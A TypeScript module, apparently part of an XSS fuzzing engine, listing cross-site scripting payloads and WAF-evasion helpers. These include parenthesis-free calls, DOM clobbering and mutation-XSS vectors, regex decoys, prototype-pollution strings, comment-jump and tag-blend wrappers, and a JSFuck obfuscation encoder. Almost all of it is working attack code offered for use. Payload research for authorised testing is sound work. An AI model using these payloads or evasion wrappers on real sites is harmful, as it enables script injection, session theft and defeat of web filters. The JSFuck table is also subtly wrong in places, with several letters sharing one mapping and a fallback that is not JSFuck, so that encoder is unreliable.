/**
 * Rotor 4: Structure — Syntax-level bypass mutations.
 *
 * Structure mutations restructure payload syntax to bypass pattern-matching
 * filters, implementing techniques from JavaScript security research
 * including JSFuck, DOM clobbering, and Brute Logic filter exploitation.
 */

export interface StructureCandidate {
  name: string;
  payload: string;
  blockerFamily?: string;
}

// ── The Parentheses Bypass Cascade ────────────────────────────────────
export const PAREN_BYPASS_CASCADE: StructureCandidate[] = [
  { name: "backticks", payload: "alert`1`", blockerFamily: "paren" },
  { name: "throw_onerror", payload: "throw onerror=alert,1", blockerFamily: "paren" },
  { name: "valueOf", payload: "({valueOf:alert})+1", blockerFamily: "paren" },
  { name: "hasInstance", payload: "'1' instanceof { [Symbol.hasInstance]: alert }", blockerFamily: "paren" },
  { name: "setInterval_template", payload: "setInterval`alert\\x281\\x29`", blockerFamily: "paren" },
  { name: "replace_template", payload: "'alert'.replace`${alert}`", blockerFamily: "paren" },
  { name: "Reflect.apply", payload: "Reflect.apply(alert,window,[1])", blockerFamily: "paren" },
  { name: "Reflect.set", payload: "Reflect.set(window,'x',alert)&&x`1`", blockerFamily: "paren" },
  { name: "html_entities", payload: "alert&#x28;1&#x29;", blockerFamily: "paren" },
  { name: "dynamic_import", payload: "import('data:text/javascript,alert(1)')", blockerFamily: "paren" },
  { name: "jsfuck", payload: "[][(![]+[])[+[]]+([][[]]+[])[+!+[]+[+[]]]][([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[])[!+[]+!+[]]]()", blockerFamily: "paren" }
];

// ── DOM Clobbering ────────────────────────────────────────────────────
// Heyes "JavaScript for Hackers" Ch.4 covers the foundational clobber gadgets
// (window refs, event scope, named accessors). The four core entries below
// cover the documented single-anchor href clobber, the form/action-named
// accessor, the named-item collection clobber, and the img currentSrc
// accessor. The additional Heyes Ch.4 gadgets below it are added on top:
//  - 3-level chained collection accessor (L1098-1111)
//  - attributes property clobber to defeat event-filter checks (L1165-1181)
//  - nodeName/tagName clobber returning "[object HTMLInputElement]" (L1187)
//  - duplicate body id/class to clobber getElementById / querySelector (L1205-1225)
export const DOM_CLOBBERING_CANDIDATES: StructureCandidate[] = [
  { name: "dom_clobber_href", payload: '<a id=config><a id=config name=src href="javascript:alert(1)">' },
  { name: "dom_clobber_form", payload: "<form id=config><input name=action value=javascript:alert(1)>" },
  { name: "dom_clobber_collection", payload: '<a id=x></a><a id=x name=y href="javascript:alert(1)"></a>' },
  { name: "dom_clobber_img", payload: "<img name=x><img id=x name=currentSrc>" },
  { name: "dom_clobber_form_three_level", payload: "<form id=x name=y><input id=z value=javascript:alert(1)></form><form id=x></form>" },
  { name: "dom_clobber_attributes", payload: "<form id=x onclick=alert(1) onmouseover=alert(1)><input name=attributes>" },
  { name: "dom_clobber_node_name", payload: "<form id=x><input name=nodeName>" },
  { name: "dom_clobber_get_element_by_id", payload: '<body id="x"><img src=x onerror=alert(1)>' },
  { name: "dom_clobber_query_selector", payload: '<body class="x"><img src=x onerror=alert(1)>' },
  { name: "dom_clobber_iframe_srcdoc_chain", payload: '<iframe name=a srcdoc="<iframe name=b srcdoc=\'<img src=x onerror=alert(1)>\'></iframe>"></iframe>' }
];

// ── Brute Logic Filter Exploitation ───────────────────────────────────
export const BRUTE_LOGIC_CANDIDATES: StructureCandidate[] = [
  { name: "regex_decoy", payload: 'id=x autofocus onfocus=alert(1) y="' },
  { name: "attribute_doubling", payload: "<img src=x onerror onerror=alert(1)>" },
  { name: "tag_boundary_confusion", payload: 'id=">"><svg onload=alert(1)>' },
  { name: "formfeed_spacer", payload: "<img src=x\fonerror=alert(1)>" }
];

// ── Advanced Strategies ───────────────────────────────────────────────
export const ADVANCED_STRATEGIES: StructureCandidate[] = [
  { name: "source_map", payload: "<script src=/app.js.map#alert(1)></script>" },
  { name: "svg_upload", payload: '<svg><script href="data:,alert(1)" /></svg>' },
  { name: "xhtml_payload", payload: '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></html>' },
  { name: "mutation_fuzz", payload: "<math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>" },
  { name: "browser_specific_firefox", payload: '<svg><script href="data:,alert(1)"/></svg>' },
  { name: "svg_entity_decode", payload: "<svg><script>&#97;lert(1)</script></svg>" }
];

// ── JSFuck Encoder ────────────────────────────────────────────────────
const JSFUCK_CHARS: Record<string, string> = {
  a: "(![]+[])[+!+[]]",
  b: "([]+{})[+!+[]+!+[]]",
  c: "([]+{})[+!+[]+!+[]+!+[]+!+[]+!+[]]",
  d: "([][[]]+[])[+!+[]+!+[]]",
  e: "(!![]+[])[+!+[]+!+[]+!+[]]",
  f: "(![]+[])[+[]]",
  g: "(+(!+[]+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+{}+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(+{}+[])[+!+[]])+[])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]",
  h: "(+(!+[]+!+[]+[+!+[]]))[+!+[]+!+[]+!+[]+!+[]]",
  i: "([][[]]+[])[+!+[]+!+[]+!+[]+!+[]+!+[]]",
  j: "([]+{})[+!+[]+!+[]+!+[]]",
  k: "(+(!+[]+!+[]+[+!+[]]))[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]",
  l: "(![]+[])[+!+[]+!+[]]",
  m: "(+{}+[])[+[]]",
  n: "([][[]]+[])[+!+[]]",
  o: "([]+{})[+!+[]]",
  p: "(+(!+[]+!+[]+[+!+[]]))[+!+[]+!+[]+!+[]+!+[]+!+[]]",
  q: '(""["fontcolor"]())[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]',
  r: "(!![]+[])[+!+[]]",
  s: "(![]+[])[+!+[]+!+[]+!+[]]",
  t: "(!![]+[])[+[]]",
  u: "([][[]]+[])[+[]]",
  v: '(""["fontcolor"]())[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]',
  w: "(+(!+[]+!+[]+!+[]+[+!+[]]))[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]",
  x: "(+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]])+[])[+!+[]+!+[]+!+[]+!+[]+!+[]]",
  y: "(+(!+[]+!+[]+[+!+[]]))[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]",
  z: "(+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+(+!+[])+(+[])+(+[])+(+[]))+[])[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]",
  A: "(+{}+[])[+[]]",
  B: "(+{}+[])[+!+[]+!+[]]",
  C: "([]+Function('return escape')()('\\\\'))[+!+[]]",
  D: "([]+Function('return escape')()('['))[+[]]",
  E: "(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[+!+[]+!+[]+!+[]+!+[]]",
  F: "(+(!+[]+!+[]+[+!+[]]))[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]",
  I: "(+(!+[]+!+[]+[+!+[]]))[+[]]",
  N: "(+{}+[])[+[]]",
  O: "([]+{})[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]",
  S: "(+(!+[]+!+[]+[+!+[]])+'')[+[]]",
  " ": "([]+Function())[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]",
  "!": "String.fromCharCode(33)",
  '"': "String.fromCharCode(34)",
  "#": "String.fromCharCode(35)",
  "(": "([]+Function('return alert')())[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]",
  ")": "([]+Function('return alert')())[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]",
  "0": "+[]",
  "1": "+!+[]",
  "2": "!+[]+!+[]",
  "3": "!+[]+!+[]+!+[]",
  "4": "!+[]+!+[]+!+[]+!+[]",
  "5": "!+[]+!+[]+!+[]+!+[]+!+[]",
  "6": "!+[]+!+[]+!+[]+!+[]+!+[]+!+[]",
  "7": "!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]",
  "8": "!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]",
  "9": "!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]"
};

/**
 * Encode a JavaScript string using only the six JSFuck characters: []()!+
 * Falls back to Function('return String')().fromCharCode for unknown chars.
 */
export function jsfuckEncode(code: string): string {
  const parts: string[] = [];
  for (const ch of code) {
    if (JSFUCK_CHARS[ch]) {
      parts.push(JSFUCK_CHARS[ch]);
    } else {
      // Use String.fromCharCode via JSFuck for unknown chars
      parts.push(`String.fromCharCode(${ch.charCodeAt(0)})`);
    }
  }
  return parts.join("+");
}

// ── Comment Jump ──────────────────────────────────────────────────────
// Splits payload across HTML comments to bypass pattern-matching WAFs.
// Comments between tag name and attributes are ignored by browsers but
// break naive regex filters.
export function toCommentJump(payload: string): string {
  // Insert <!---> between tag name and first attribute, and between attributes
  return payload
    .replace(/(<\w+)([\s]+)/g, "$1<!---->")
    .replace(/([\s]+)(\/?>)/g, "<!---->$2");
}

// ── Tag Blend ─────────────────────────────────────────────────────────
// Combines multiple tags to confuse parser state machines.
// Exploits browser error recovery differing from WAF parsing.
export function toTagBlend(payload: string): string {
  // Wrap in SVG+style to hide from WAF regex while SVG parser executes
  return `<svg><style><img src=x onerror=${payload}//</style></svg>`;
}

// ── Tagged Template (parentheses-free call) ───────────────────────────
export function toTaggedTemplate(func: string): string {
  return `${func}\`1\``;
}

// ── Throw Onerror (parentheses-free call) ─────────────────────────────
export function toThrowOnerror(func: string): string {
  return `throw onerror=${func},1`;
}

// ── DOM Clobber Builder ───────────────────────────────────────────────
export function toDomClobber(property: string, value: string): string {
  return `<a id=${property}><a id=${property} name=src href="${value}">`;
}

// ── Prototype Pollution innerHTML Gadgets ─────────────────────────────
export function toPrototypePollutionInnerHTML(property: string, handler: string): string {
  const gadgets = [
    `__proto__[${property}]=${handler}`,
    `constructor.prototype.${property}=${handler}`,
    `__proto__[innerHTML]=<img src=x onerror=${handler}>`,
  ];
  return gadgets.join("\n");
}

// ── Regex Decoy (Brute Logic) ─────────────────────────────────────────
export function toRegexDecoy(payload: string): string {
  return `id=x autofocus onfocus=${payload} y="`;
}

// ── Aggregated structure candidates ───────────────────────────────────
// Sub-techniques within the competitor's named cascade families
// (see https://labs.trace37.com/blog/enigma-xss-engine/ "Rotor 4: Structure"
//  and "Brute Logic Filter Exploitation").
//   prototype_pollution  — Heyes Ch.6 "Prototype pollution" (JavaScript for Hackers p.44-50)
//   window_name          — Heyes window.name cross-origin smuggle vector
//   comment_jump         — Variant of "Tag boundary confusion" (Brute Logic filter exploitation)
//   tag_blend            — SVG/style parser-differential wrapper mutation
export const ADVANCED_STRUCTURE_CANDIDATES: StructureCandidate[] = [
  ...PAREN_BYPASS_CASCADE,
  ...DOM_CLOBBERING_CANDIDATES,
  ...BRUTE_LOGIC_CANDIDATES,
  ...ADVANCED_STRATEGIES,
  { name: "prototype_pollution", payload: "__proto__[onerror]=alert,throw 1" },
  { name: "window_name", payload: "<script>name='javascript:alert(1)'</script>" },
  { name: "comment_jump", payload: "<img<!---->src=x<!---->onerror=alert(1)>" },
  { name: "tag_blend", payload: "<svg><style><img src=x onerror=alert(1)//</style></svg>" },
];
